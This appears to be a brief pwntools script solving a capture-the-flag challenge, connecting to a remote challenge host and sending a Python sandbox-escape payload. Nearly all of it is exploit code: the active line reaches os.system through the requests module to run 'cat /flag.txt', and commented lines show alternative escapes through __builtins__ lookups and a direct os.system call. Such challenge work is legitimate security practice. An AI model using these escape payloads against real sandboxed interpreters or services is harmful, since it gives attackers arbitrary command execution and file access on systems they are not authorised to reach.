
# exploit = "print(__builtins__.__dict__[getattr('OPEN', dir('OPEN')[59])()]('/FLAG.TXT'.lower()).read())"

from pwn import *

conn = remote('chal.sigpwny.com', 5017)

conn.recvline()


# import os; os.system("cat /flag.txt")

exploit = "import requests; requests.utils.os.system('cat /flag.txt')"

# print("\FLAG.TXT".lower())


conn.sendline(exploit.encode())
conn.interactive()